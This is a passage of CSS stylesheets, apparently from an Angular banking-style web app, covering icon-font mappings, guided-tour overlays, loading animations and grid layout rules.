      content: "\e97e"
    }

    .icon-retiro[_ngcontent-qmv-c234]:before {
      content: "\e97f"
    }

    .icon-salario[_ngcontent-qmv-c234]:before {
      content: "\e980"
    }

    .icon-salida[_ngcontent-qmv-c234]:before {
      content: "\e981"
    }

    .icon-salir[_ngcontent-qmv-c234]:before {
      content: "\e982"
    }

    .icon-salud[_ngcontent-qmv-c234]:before {
      content: "\e983"
    }

    .icon-seguridad[_ngcontent-qmv-c234]:before {
      content: "\e984"
    }

    .icon-seguridad2[_ngcontent-qmv-c234]:before {
      content: "\e985"
    }

    .icon-seguro[_ngcontent-qmv-c234]:before {
      content: "\e986"
    }

    .icon-senal[_ngcontent-qmv-c234]:before {
      content: "\e987"
    }

    .icon-siguiente[_ngcontent-qmv-c234]:before {
      content: "\e988"
    }

    .icon-sin_sonido[_ngcontent-qmv-c234]:before {
      content: "\e989"
    }

    .icon-subir_docs[_ngcontent-qmv-c234]:before {
      content: "\e98a"
    }

    .icon-target[_ngcontent-qmv-c234]:before {
      content: "\e98b"
    }

    .icon-tarjeta[_ngcontent-qmv-c234]:before {
      content: "\e98c"
    }

    .icon-telefono[_ngcontent-qmv-c234]:before {
      content: "\e98d"
    }

    .icon-tiempo[_ngcontent-qmv-c234]:before {
      content: "\e98e"
    }

    .icon-transferencia_celular[_ngcontent-qmv-c234]:before {
      content: "\e98f"
    }

    .icon-Transferencia_rapida[_ngcontent-qmv-c234]:before {
      content: "\e990"
    }

    .icon-transmitir[_ngcontent-qmv-c234]:before {
      content: "\e991"
    }

    .icon-tres_puntos_horizontal[_ngcontent-qmv-c234]:before {
      content: "\e992"
    }

    .icon-tres_puntos[_ngcontent-qmv-c234]:before {
      content: "\e993"
    }

    .icon-ubicacion[_ngcontent-qmv-c234]:before {
      content: "\e994"
    }

    .icon-up[_ngcontent-qmv-c234]:before {
      content: "\e995"
    }

    .icon-usuario[_ngcontent-qmv-c234]:before {
      content: "\e996"
    }

    .icon-vacaciones_viajes[_ngcontent-qmv-c234]:before {
      content: "\e997"
    }

    .icon-vehiculos[_ngcontent-qmv-c234]:before {
      content: "\e998"
    }

    .icon-ver[_ngcontent-qmv-c234]:before {
      content: "\e999"
    }

    .icon-video[_ngcontent-qmv-c234]:before {
      content: "\e99a"
    }

    .icon-volume[_ngcontent-qmv-c234]:before {
      content: "\e99b"
    }

    .icon-volumen_alto[_ngcontent-qmv-c234]:before {
      content: "\e99c"
    }

    .icon-web[_ngcontent-qmv-c234]:before {
      content: "\e99d"
    }

    .icon-wifi[_ngcontent-qmv-c234]:before {
      content: "\e99e"
    }

    div.guided-tour-spotlight-overlay {
      z-index: 1001;
      box-shadow: 0 0 0 9999px #000000a3 !important
    }

    div.guided-tour-spotlight-overlay.sidebar {
      border-radius: 0 100px 100px 0
    }

    @media (max-width: 767.98px) {
      div.guided-tour-spotlight-overlay.sidebar {
        border-radius: 100px 100px 0 0
      }
    }

    div.guided-tour-spotlight-overlay.header {
      border-radius: 100px;
      top: 11px !important
    }

    @media (max-width: 1199px) {
      div.guided-tour-spotlight-overlay.header {
        border-radius: 100px 0 0 100px;
        top: 4px !important
      }
    }

    div.tour-step {
      z-index: 1001;
      background: #fff;
      max-width: 400px !important;
      width: 360px !important;
      height: 320px !important;
      left: 50% !important;
      top: 50% !important;
      transform: translate(-50%, -50%) !important;
      border-radius: 4px;
      box-shadow: 0 2px 8px #414a534d
    }

    @media (max-width: 767.98px) {
      div.tour-step {
        width: 288px !important
      }
    }

    div.tour-step div.tour-block {
      margin: 0 !important;
      padding: 30px 52px 21px;
      height: 100%
    }

    @media (max-width: 767.98px) {
      div.tour-step div.tour-block {
        padding: 30px 16px 21px
      }
    }

    div.tour-step div.tour-block div.tour-progress-indicator {
      padding: 0
    }

    div.tour-step div.tour-block div.tour-progress-indicator div.tour-step-image {
      text-align: center
    }

    div.tour-step div.tour-block div.tour-progress-indicator div.tour-step-image img {
      height: 72px
    }

    div.tour-step div.tour-block div.tour-progress-indicator ul.tour-steps {
      list-style: none;
      display: flex;
      justify-content: center;
      gap: 12px;
      padding: 0;
      margin: 24px auto 0;
      width: 180px
    }

    div.tour-step div.tour-block div.tour-progress-indicator ul.tour-steps li {
      background-color: #acbac9;
      border: 1px solid #ACBAC9;
      height: 12px;
      width: 12px;
      border-radius: 50%;
      cursor: pointer
    }

    div.tour-step div.tour-block div.tour-progress-indicator ul.tour-steps li.active {
      background-color: #0062b7;
      border: 1px solid #0062B7;
      cursor: auto
    }

    div.tour-step div.tour-block h2.tour-title,
    div.tour-step div.tour-block h3.tour-title {
      margin: 24px 0 0;
      padding: 0;
      font-weight: 600 !important;
      text-align: center;
      color: #414a53
    }

    div.tour-step div.tour-block h2.tour-title {
      font-size: 18px;
      line-height: 1.56
    }

    div.tour-step div.tour-block h3.tour-title {
      font-size: 16px;
      line-height: 1.5
    }

    div.tour-step div.tour-block div.tour-content {
      margin: 0;
      padding: 0;
      min-height: 0;
      font-size: 14px;
      font-weight: 400;
      line-height: 1.71;
      text-align: center;
      color: #414a53
    }

    div.tour-step div.tour-block div.tour-buttons button.skip-button {
      position: absolute;
      top: 16px;
      right: 16px;
      padding: 0;
      margin: 0
    }

    div.tour-step div.tour-block div.tour-buttons button.skip-button:after {
      font-family: icomoon, serif !important;
      content: "\e982";
      font-size: 16px;
      font-weight: 400;
      color: #414a53
    }

    div.tour-step div.tour-block div.tour-buttons button.next-button {
      position: absolute;
      bottom: 21px;
      left: 50%;
      transform: translate(-50%);
      font-size: 14px;
      font-weight: 600;
      line-height: 1.57;
      color: #0014a2;
      border: none;
      background: none
    }

    div.tour-step div.tour-block div.tour-buttons button.next-button:after {
      font-family: icomoon, serif !important;
      content: "\e988";
      vertical-align: middle;
      font-size: 24px;
      font-weight: 400
    }

    div.tour-step div.tour-block div.tour-buttons button.back-button {
      display: none
    }
  </style>
  <style>
    @keyframes arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .loading-general {
      position: fixed;
      text-align: center;
      width: 100%;
      height: 100vh;
      top: 0;
      left: 0;
      background-color: #fffc;
      z-index: 99999;
      display: table
    }

    .loading-general>div {
      display: table-cell;
      vertical-align: middle
    }

    .loading-general .blobs {
      height: 300px;
      position: relative;
      overflow: hidden;
      border-radius: 70px;
      transform-style: preserve-3d
    }

    .loading-general .blobs .blob-center {
      transform-style: preserve-3d;
      position: absolute;
      background: #E1001D;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      transform-origin: left top;
      transform: scale(.9) translate(-50%, -50%);
      animation: blob-grow linear 3.4s infinite;
      border-radius: 50%;
      z-index: 1;
      padding: 2px 0 0 4px
    }

    .loading-general .blob {
      position: absolute;
      background: #E1001D;
      top: 50%;
      left: 50%;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      animation: blobs ease-out 3.4s infinite;
      transform: scale(.9) translate(-50%, -50%);
      transform-origin: center top;
      opacity: 0
    }

    .loading-general .blob:nth-child(1) {
      animation-delay: .2s
    }

    .loading-general .blob:nth-child(2) {
      animation-delay: .4s
    }

    .loading-general .blob:nth-child(3) {
      animation-delay: .6s
    }

    .loading-general .blob:nth-child(4) {
      animation-delay: .8s
    }

    .loading-general .blob:nth-child(5) {
      animation-delay: 1s
    }

    @keyframes blobs {
      0% {
        opacity: 0;
        transform: scale(0) translate(calc(-330px - 50%), -50%)
      }

      1% {
        opacity: 1
      }

      35%,
      65% {
        opacity: 1;
        transform: scale(.9) translate(-50%, -50%)
      }

      99% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: scale(0) translate(calc(330px - 50%), -50%)
      }
    }

    @keyframes blob-grow {

      0%,
      39% {
        transform: scale(0) translate(-50%, -50%)
      }

      40%,
      42% {
        transform: scaleY(.9) translate(-50%, -50%)
      }

      43%,
      44% {
        transform: scale(1.2, 1.1) translate(-50%, -50%)
      }

      45%,
      46% {
        transform: scale(1.3, 1.2) translate(-50%, -50%)
      }

      47%,
      48% {
        transform: scale(1.4, 1.3) translate(-50%, -50%)
      }

      52% {
        transform: scale(1.5, 1.4) translate(-50%, -50%)
      }

      54% {
        transform: scale(1.7, 1.6) translate(-50%, -50%)
      }

      58% {
        transform: scale(1.8, 1.7) translate(-50%, -50%)
      }

      68%,
      70% {
        transform: scale(1.7, 1.5) translate(-50%, -50%)
      }

      78% {
        transform: scale(1.6, 1.4) translate(-50%, -50%)
      }

      80%,
      81% {
        transform: scale(1.5, 1.4) translate(-50%, -50%)
      }

      82%,
      83% {
        transform: scale(1.4, 1.3) translate(-50%, -50%)
      }

      84%,
      85% {
        transform: scale(1.3, 1.2) translate(-50%, -50%)
      }

      86%,
      87% {
        transform: scale(1.2, 1.1) translate(-50%, -50%)
      }

      90%,
      91% {
        transform: scaleY(.9) translate(-50%, -50%)
      }

      92%,
      to {
        transform: scale(0) translate(-50%, -50%)
      }
    }
  </style>
  <style>
    ngx-guided-tour .guided-tour-user-input-mask {
      position: fixed;
      top: 0;
      left: 0;
      display: block;
      height: 100%;
      width: 100%;
      max-height: 100vh;
      text-align: center;
      opacity: 0
    }

    ngx-guided-tour .guided-tour-spotlight-overlay {
      position: fixed;
      box-shadow: 0 0 0 9999px #000000b3, 0 0 1.5rem #00000080
    }

    ngx-guided-tour .tour-orb {
      position: fixed;
      width: 20px;
      height: 20px;
      border-radius: 50%
    }

    ngx-guided-tour .tour-orb .tour-orb-ring {
      width: 35px;
      height: 35px;
      position: relative;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: pulse 2s linear infinite
    }

    ngx-guided-tour .tour-orb .tour-orb-ring:after {
      content: "";
      display: inline-block;
      height: 100%;
      width: 100%;
      border-radius: 50%
    }

    @keyframes pulse {
      0% {
        transform: translate(-50%, -50%) scale(.45);
        opacity: 1
      }

      to {
        transform: translate(-50%, -50%) scale(1);
        opacity: 0
      }
    }

    ngx-guided-tour .tour-step {
      position: fixed
    }

    ngx-guided-tour .tour-step.page-tour-step {
      max-width: 400px;
      width: 50%;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%)
    }

    ngx-guided-tour .tour-step.tour-bottom .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-bottom-right .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-bottom-left .tour-arrow:before {
      position: absolute
    }

    ngx-guided-tour .tour-step.tour-bottom .tour-block,
    ngx-guided-tour .tour-step.tour-bottom-right .tour-block,
    ngx-guided-tour .tour-step.tour-bottom-left .tour-block {
      margin-top: 10px
    }

    ngx-guided-tour .tour-step.tour-top,
    ngx-guided-tour .tour-step.tour-top-right,
    ngx-guided-tour .tour-step.tour-top-left {
      margin-bottom: 10px
    }

    ngx-guided-tour .tour-step.tour-top .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-top-right .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-top-left .tour-arrow:before {
      position: absolute;
      bottom: 0
    }

    ngx-guided-tour .tour-step.tour-top .tour-block,
    ngx-guided-tour .tour-step.tour-top-right .tour-block,
    ngx-guided-tour .tour-step.tour-top-left .tour-block {
      margin-bottom: 10px
    }

    ngx-guided-tour .tour-step.tour-bottom .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-top .tour-arrow:before {
      transform: translate(-50%);
      left: 50%
    }

    ngx-guided-tour .tour-step.tour-bottom-right .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-top-right .tour-arrow:before {
      transform: translate(-100%);
      left: calc(100% - 5px)
    }

    ngx-guided-tour .tour-step.tour-bottom-left .tour-arrow:before,
    ngx-guided-tour .tour-step.tour-top-left .tour-arrow:before {
      left: 5px
    }

    ngx-guided-tour .tour-step.tour-left .tour-arrow:before {
      position: absolute;
      left: 100%;
      transform: translate(-100%);
      top: 5px
    }

    ngx-guided-tour .tour-step.tour-left .tour-block {
      margin-right: 10px
    }

    ngx-guided-tour .tour-step.tour-right .tour-arrow:before {
      position: absolute;
      left: 0;
      top: 5px
    }

    ngx-guided-tour .tour-step.tour-right .tour-block {
      margin-left: 10px
    }

    ngx-guided-tour .tour-step .tour-block {
      padding: 15px 25px
    }

    ngx-guided-tour .tour-step .tour-progress-indicator {
      padding-bottom: 15px
    }

    ngx-guided-tour .tour-step .tour-title {
      font-weight: 700 !important;
      padding-bottom: 20px
    }

    ngx-guided-tour .tour-step h3.tour-title {
      font-size: 20px
    }

    ngx-guided-tour .tour-step h2.tour-title {
      font-size: 30px
    }

    ngx-guided-tour .tour-step .tour-content {
      min-height: 80px;
      padding-bottom: 30px;
      font-size: 15px
    }

    ngx-guided-tour .tour-step .tour-buttons {
      overflow: hidden
    }

    ngx-guided-tour .tour-step .tour-buttons button.link-button {
      font-size: 15px;
      font-weight: 700;
      max-width: none !important;
      cursor: pointer;
      text-align: center;
      white-space: nowrap;
      vertical-align: middle;
      border: 1px solid transparent;
      line-height: 1.5;
      background-color: transparent;
      position: relative;
      outline: none;
      padding: 0 15px;
      -webkit-appearance: button
    }

    ngx-guided-tour .tour-step .tour-buttons button.skip-button.link-button {
      padding-left: 0;
      border-left: 0
    }

    ngx-guided-tour .tour-step .tour-buttons .back-button {
      float: right
    }

    ngx-guided-tour .tour-step .tour-buttons .next-button {
      cursor: pointer;
      border-radius: 1px;
      float: right;
      font-size: 14px;
      border: none;
      outline: none;
      padding-left: 10px;
      padding-right: 10px
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c253_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c253_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .container[_ngcontent-qmv-c253] {
      width: 100%;
      padding-right: 15px;
      padding-left: 15px;
      margin-right: auto;
      margin-left: auto
    }

    @media (min-width: 576px) {
      .container[_ngcontent-qmv-c253] {
        max-width: 540px
      }
    }

    @media (min-width: 768px) {
      .container[_ngcontent-qmv-c253] {
        max-width: 720px
      }
    }

    @media (min-width: 992px) {
      .container[_ngcontent-qmv-c253] {
        max-width: 960px
      }
    }

    @media (min-width: 1200px) {
      .container[_ngcontent-qmv-c253] {
        max-width: 1300px
      }
    }

    @media (max-width: 1199.98px) {
      .container[_ngcontent-qmv-c253] {
        padding: 0
      }
    }

    .container-fluid[_ngcontent-qmv-c253] {
      width: 100%;
      padding-right: 15px;
      padding-left: 15px;
      margin-right: auto;
      margin-left: auto
    }

    .row[_ngcontent-qmv-c253] {
      display: flex;
      flex-wrap: wrap;
      margin-right: -15px;
      margin-left: -15px
    }

    .no-gutters[_ngcontent-qmv-c253] {
      margin-right: 0;
      margin-left: 0
    }

    .no-gutters[_ngcontent-qmv-c253]>.col[_ngcontent-qmv-c253],
    .no-gutters[_ngcontent-qmv-c253]>[class*=col-][_ngcontent-qmv-c253] {
      padding-right: 0;
      padding-left: 0
    }

    .col-xl[_ngcontent-qmv-c253],
    .col-xl-auto[_ngcontent-qmv-c253],
    .col-xl-12[_ngcontent-qmv-c253],
    .col-xl-11[_ngcontent-qmv-c253],
    .col-xl-10[_ngcontent-qmv-c253],
    .col-xl-9[_ngcontent-qmv-c253],
    .col-xl-8[_ngcontent-qmv-c253],
    .col-xl-7[_ngcontent-qmv-c253],
    .col-xl-6[_ngcontent-qmv-c253],
    .col-xl-5[_ngcontent-qmv-c253],
    .col-xl-4[_ngcontent-qmv-c253],
    .col-xl-3[_ngcontent-qmv-c253],
    .col-xl-2[_ngcontent-qmv-c253],
    .col-xl-1[_ngcontent-qmv-c253],
    .col-lg[_ngcontent-qmv-c253],
    .col-lg-auto[_ngcontent-qmv-c253],
    .col-lg-12[_ngcontent-qmv-c253],
    .col-lg-11[_ngcontent-qmv-c253],
    .col-lg-10[_ngcontent-qmv-c253],
    .col-lg-9[_ngcontent-qmv-c253],
    .col-lg-8[_ngcontent-qmv-c253],
    .col-lg-7[_ngcontent-qmv-c253],
    .col-lg-6[_ngcontent-qmv-c253],
    .col-lg-5[_ngcontent-qmv-c253],
    .col-lg-4[_ngcontent-qmv-c253],
    .col-lg-3[_ngcontent-qmv-c253],
    .col-lg-2[_ngcontent-qmv-c253],
    .col-lg-1[_ngcontent-qmv-c253],
    .col-md[_ngcontent-qmv-c253],
    .col-md-auto[_ngcontent-qmv-c253],
    .col-md-12[_ngcontent-qmv-c253],
    .col-md-11[_ngcontent-qmv-c253],
    .col-md-10[_ngcontent-qmv-c253],
    .col-md-9[_ngcontent-qmv-c253],
    .col-md-8[_ngcontent-qmv-c253],
    .col-md-7[_ngcontent-qmv-c253],
    .col-md-6[_ngcontent-qmv-c253],
    .col-md-5[_ngcontent-qmv-c253],
    .col-md-4[_ngcontent-qmv-c253],
    .col-md-3[_ngcontent-qmv-c253],
    .col-md-2[_ngcontent-qmv-c253],
    .col-md-1[_ngcontent-qmv-c253],
    .col-sm[_ngcontent-qmv-c253],
    .col-sm-auto[_ngcontent-qmv-c253],
    .col-sm-12[_ngcontent-qmv-c253],
    .col-sm-11[_ngcontent-qmv-c253],
    .col-sm-10[_ngcontent-qmv-c253],
    .col-sm-9[_ngcontent-qmv-c253],
    .col-sm-8[_ngcontent-qmv-c253],
    .col-sm-7[_ngcontent-qmv-c253],
    .col-sm-6[_ngcontent-qmv-c253],
    .col-sm-5[_ngcontent-qmv-c253],
    .col-sm-4[_ngcontent-qmv-c253],
    .col-sm-3[_ngcontent-qmv-c253],
    .col-sm-2[_ngcontent-qmv-c253],
    .col-sm-1[_ngcontent-qmv-c253],
    .col[_ngcontent-qmv-c253],
    .col-auto[_ngcontent-qmv-c253],
    .col-12[_ngcontent-qmv-c253],
    .col-11[_ngcontent-qmv-c253],
    .col-10[_ngcontent-qmv-c253],
    .col-9[_ngcontent-qmv-c253],
    .col-8[_ngcontent-qmv-c253],
    .col-7[_ngcontent-qmv-c253],
    .col-6[_ngcontent-qmv-c253],
    .col-5[_ngcontent-qmv-c253],
    .col-4[_ngcontent-qmv-c253],
    .col-3[_ngcontent-qmv-c253],
    .col-2[_ngcontent-qmv-c253],
    .col-1[_ngcontent-qmv-c253] {
      position: relative;
      width: 100%;
      min-height: 1px;
      padding-right: 15px;
      padding-left: 15px
    }

    .col[_ngcontent-qmv-c253] {
      flex-basis: 0;
      flex-grow: 1;
      max-width: 100%
    }

    .col-auto[_ngcontent-qmv-c253] {
      flex: 0 0 auto;
      width: auto;
      max-width: none
    }

    .col-1[_ngcontent-qmv-c253] {
      flex: 0 0 8.3333333333%;
      max-width: 8.3333333333%
    }

    .col-2[_ngcontent-qmv-c253] {
      flex: 0 0 16.6666666667%;
      max-width: 16.6666666667%
    }

    .col-3[_ngcontent-qmv-c253] {
      flex: 0 0 25%;
      max-width: 25%
    }

    .col-4[_ngcontent-qmv-c253] {
      flex: 0 0 33.3333333333%;
      max-width: 33.3333333333%
    }

    .col-5[_ngcontent-qmv-c253] {
      flex: 0 0 41.6666666667%;
      max-width: 41.6666666667%
    }

    .col-6[_ngcontent-qmv-c253] {
      flex: 0 0 50%;
      max-width: 50%
    }

    .col-7[_ngcontent-qmv-c253] {
      flex: 0 0 58.3333333333%;
      max-width: 58.3333333333%
    }

    .col-8[_ngcontent-qmv-c253] {
      flex: 0 0 66.6666666667%;
      max-width: 66.6666666667%
    }

    .col-9[_ngcontent-qmv-c253] {
      flex: 0 0 75%;
      max-width: 75%
    }

    .col-10[_ngcontent-qmv-c253] {
      flex: 0 0 83.3333333333%;
      max-width: 83.3333333333%
    }

    .col-11[_ngcontent-qmv-c253] {
      flex: 0 0 91.6666666667%;
      max-width: 91.6666666667%
    }

    .col-12[_ngcontent-qmv-c253] {
      flex: 0 0 100%;
      max-width: 100%
    }

    .order-first[_ngcontent-qmv-c253] {
      order: -1
    }

    .order-last[_ngcontent-qmv-c253] {
      order: 13
    }

    .order-0[_ngcontent-qmv-c253] {
      order: 0
    }

    .order-1[_ngcontent-qmv-c253] {
      order: 1
    }

    .order-2[_ngcontent-qmv-c253] {
      order: 2
    }

    .order-3[_ngcontent-qmv-c253] {
      order: 3
    }

    .order-4[_ngcontent-qmv-c253] {
      order: 4
    }

    .order-5[_ngcontent-qmv-c253] {
      order: 5
    }

    .order-6[_ngcontent-qmv-c253] {
      order: 6
    }

    .order-7[_ngcontent-qmv-c253] {
      order: 7
    }

    .order-8[_ngcontent-qmv-c253] {
      order: 8
    }

    .order-9[_ngcontent-qmv-c253] {
      order: 9
    }

    .order-10[_ngcontent-qmv-c253] {
      order: 10
    }

    .order-11[_ngcontent-qmv-c253] {
      order: 11
    }

    .order-12[_ngcontent-qmv-c253] {
      order: 12
    }

    .offset-1[_ngcontent-qmv-c253] {
      margin-left: 8.3333333333%
    }

    .offset-2[_ngcontent-qmv-c253] {
      margin-left: 16.6666666667%
    }

    .offset-3[_ngcontent-qmv-c253] {
      margin-left: 25%
    }

    .offset-4[_ngcontent-qmv-c253] {
      margin-left: 33.3333333333%
    }

    .offset-5[_ngcontent-qmv-c253] {
      margin-left: 41.6666666667%
    }

    .offset-6[_ngcontent-qmv-c253] {
      margin-left: 50%
    }

    .offset-7[_ngcontent-qmv-c253] {
      margin-left: 58.3333333333%
    }

    .offset-8[_ngcontent-qmv-c253] {
      margin-left: 66.6666666667%
    }

    .offset-9[_ngcontent-qmv-c253] {
      margin-left: 75%
    }

    .offset-10[_ngcontent-qmv-c253] {
      margin-left: 83.3333333333%
    }

    .offset-11[_ngcontent-qmv-c253] {
      margin-left: 91.6666666667%
    }

    @media (min-width: 576px) {
      .col-sm[_ngcontent-qmv-c253] {
        flex-basis: 0;
        flex-grow: 1;
        max-width: 100%
      }

      .col-sm-auto[_ngcontent-qmv-c253] {
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-sm-1[_ngcontent-qmv-c253] {
        flex: 0 0 8.3333333333%;
        max-width: 8.3333333333%
      }

      .col-sm-2[_ngcontent-qmv-c253] {
        flex: 0 0 16.6666666667%;
        max-width: 16.6666666667%
      }

      .col-sm-3[_ngcontent-qmv-c253] {
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-sm-4[_ngcontent-qmv-c253] {
        flex: 0 0 33.3333333333%;
        max-width: 33.3333333333%
      }

      .col-sm-5[_ngcontent-qmv-c253] {
        flex: 0 0 41.6666666667%;
        max-width: 41.6666666667%
      }

      .col-sm-6[_ngcontent-qmv-c253] {
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-sm-7[_ngcontent-qmv-c253] {
        flex: 0 0 58.3333333333%;
        max-width: 58.3333333333%
      }

      .col-sm-8[_ngcontent-qmv-c253] {
        flex: 0 0 66.6666666667%;
        max-width: 66.6666666667%
      }

      .col-sm-9[_ngcontent-qmv-c253] {
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-sm-10[_ngcontent-qmv-c253] {
        flex: 0 0 83.3333333333%;
        max-width: 83.3333333333%
      }

      .col-sm-11[_ngcontent-qmv-c253] {
        flex: 0 0 91.6666666667%;
        max-width: 91.6666666667%
      }

      .col-sm-12[_ngcontent-qmv-c253] {
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-sm-first[_ngcontent-qmv-c253] {
        order: -1
      }

      .order-sm-last[_ngcontent-qmv-c253] {
        order: 13
      }

      .order-sm-0[_ngcontent-qmv-c253] {
        order: 0
      }

      .order-sm-1[_ngcontent-qmv-c253] {
        order: 1
      }

      .order-sm-2[_ngcontent-qmv-c253] {
        order: 2
      }

      .order-sm-3[_ngcontent-qmv-c253] {
        order: 3
      }

      .order-sm-4[_ngcontent-qmv-c253] {
        order: 4
      }

      .order-sm-5[_ngcontent-qmv-c253] {
        order: 5
      }

      .order-sm-6[_ngcontent-qmv-c253] {
        order: 6
      }

      .order-sm-7[_ngcontent-qmv-c253] {
        order: 7
      }

      .order-sm-8[_ngcontent-qmv-c253] {
        order: 8
      }

      .order-sm-9[_ngcontent-qmv-c253] {
        order: 9
      }

      .order-sm-10[_ngcontent-qmv-c253] {
        order: 10
      }

      .order-sm-11[_ngcontent-qmv-c253] {
        order: 11
      }

      .order-sm-12[_ngcontent-qmv-c253] {
        order: 12
      }

      .offset-sm-0[_ngcontent-qmv-c253] {
        margin-left: 0
      }

      .offset-sm-1[_ngcontent-qmv-c253] {
        margin-left: 8.3333333333%
      }

      .offset-sm-2[_ngcontent-qmv-c253] {
        margin-left: 16.6666666667%
      }

      .offset-sm-3[_ngcontent-qmv-c253] {
        margin-left: 25%
      }

      .offset-sm-4[_ngcontent-qmv-c253] {
        margin-left: 33.3333333333%
      }

      .offset-sm-5[_ngcontent-qmv-c253] {
        margin-left: 41.6666666667%
      }

      .offset-sm-6[_ngcontent-qmv-c253] {
        margin-left: 50%
      }

      .offset-sm-7[_ngcontent-qmv-c253] {
        margin-left: 58.3333333333%
      }

      .offset-sm-8[_ngcontent-qmv-c253] {
        margin-left: 66.6666666667%
      }

      .offset-sm-9[_ngcontent-qmv-c253] {
        margin-left: 75%
      }

      .offset-sm-10[_ngcontent-qmv-c253] {
        margin-left: 83.3333333333%
      }

      .offset-sm-11[_ngcontent-qmv-c253] {
        margin-left: 91.6666666667%
      }
    }

    @media (min-width: 768px) {
      .col-md[_ngcontent-qmv-c253] {
        flex-basis: 0;
        flex-grow: 1;
        max-width: 100%
      }

      .col-md-auto[_ngcontent-qmv-c253] {
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-md-1[_ngcontent-qmv-c253] {
        flex: 0 0 8.3333333333%;
        max-width: 8.3333333333%
      }

      .col-md-2[_ngcontent-qmv-c253] {
        flex: 0 0 16.6666666667%;
        max-width: 16.6666666667%
      }

      .col-md-3[_ngcontent-qmv-c253] {
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-md-4[_ngcontent-qmv-c253] {
        flex: 0 0 33.3333333333%;
        max-width: 33.3333333333%
      }

      .col-md-5[_ngcontent-qmv-c253] {
        flex: 0 0 41.6666666667%;
        max-width: 41.6666666667%
      }

      .col-md-6[_ngcontent-qmv-c253] {
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-md-7[_ngcontent-qmv-c253] {
        flex: 0 0 58.3333333333%;
        max-width: 58.3333333333%
      }

      .col-md-8[_ngcontent-qmv-c253] {
        flex: 0 0 66.6666666667%;
        max-width: 66.6666666667%
      }

      .col-md-9[_ngcontent-qmv-c253] {
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-md-10[_ngcontent-qmv-c253] {
        flex: 0 0 83.3333333333%;
        max-width: 83.3333333333%
      }

      .col-md-11[_ngcontent-qmv-c253] {
        flex: 0 0 91.6666666667%;
        max-width: 91.6666666667%
      }

      .col-md-12[_ngcontent-qmv-c253] {
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-md-first[_ngcontent-qmv-c253] {
        order: -1
      }

      .order-md-last[_ngcontent-qmv-c253] {
        order: 13
      }

      .order-md-0[_ngcontent-qmv-c253] {
        order: 0
      }

      .order-md-1[_ngcontent-qmv-c253] {
        order: 1
      }

      .order-md-2[_ngcontent-qmv-c253] {
        order: 2
      }

      .order-md-3[_ngcontent-qmv-c253] {
        order: 3
      }

      .order-md-4[_ngcontent-qmv-c253] {
        order: 4
      }

      .order-md-5[_ngcontent-qmv-c253] {
        order: 5
      }

      .order-md-6[_ngcontent-qmv-c253] {
        order: 6
      }

      .order-md-7[_ngcontent-qmv-c253] {
        order: 7
      }

      .order-md-8[_ngcontent-qmv-c253] {
        order: 8
      }

      .order-md-9[_ngcontent-qmv-c253] {
        order: 9
      }

      .order-md-10[_ngcontent-qmv-c253] {
        order: 10
      }

      .order-md-11[_ngcontent-qmv-c253] {
        order: 11
      }

      .order-md-12[_ngcontent-qmv-c253] {
        order: 12
      }

      .offset-md-0[_ngcontent-qmv-c253] {
        margin-left: 0
      }

      .offset-md-1[_ngcontent-qmv-c253] {
        margin-left: 8.3333333333%
      }

      .offset-md-2[_ngcontent-qmv-c253] {
        margin-left: 16.6666666667%
      }

      .offset-md-3[_ngcontent-qmv-c253] {
        margin-left: 25%
      }

      .offset-md-4[_ngcontent-qmv-c253] {
        margin-left: 33.3333333333%
      }

      .offset-md-5[_ngcontent-qmv-c253] {
        margin-left: 41.6666666667%
      }

      .offset-md-6[_ngcontent-qmv-c253] {
        margin-left: 50%
      }

      .offset-md-7[_ngcontent-qmv-c253] {
        margin-left: 58.3333333333%
      }

      .offset-md-8[_ngcontent-qmv-c253] {
        margin-left: 66.6666666667%
      }

      .offset-md-9[_ngcontent-qmv-c253] {
        margin-left: 75%
      }

      .offset-md-10[_ngcontent-qmv-c253] {
        margin-left: 83.3333333333%
      }

      .offset-md-11[_ngcontent-qmv-c253] {
        margin-left: 91.6666666667%
      }
    }

    @media (min-width: 992px) {
      .col-lg[_ngcontent-qmv-c253] {
        flex-basis: 0;
        flex-grow: 1;
        max-width: 100%
      }

      .col-lg-auto[_ngcontent-qmv-c253] {
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-lg-1[_ngcontent-qmv-c253] {
        flex: 0 0 8.3333333333%;
        max-width: 8.3333333333%
      }

      .col-lg-2[_ngcontent-qmv-c253] {
        flex: 0 0 16.6666666667%;
        max-width: 16.6666666667%
      }

      .col-lg-3[_ngcontent-qmv-c253] {
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-lg-4[_ngcontent-qmv-c253] {
        flex: 0 0 33.3333333333%;
        max-width: 33.3333333333%
      }

      .col-lg-5[_ngcontent-qmv-c253] {
        flex: 0 0 41.6666666667%;
        max-width: 41.6666666667%
      }

      .col-lg-6[_ngcontent-qmv-c253] {
        flex: 0 0 50%;
        max-width: 50%
      }

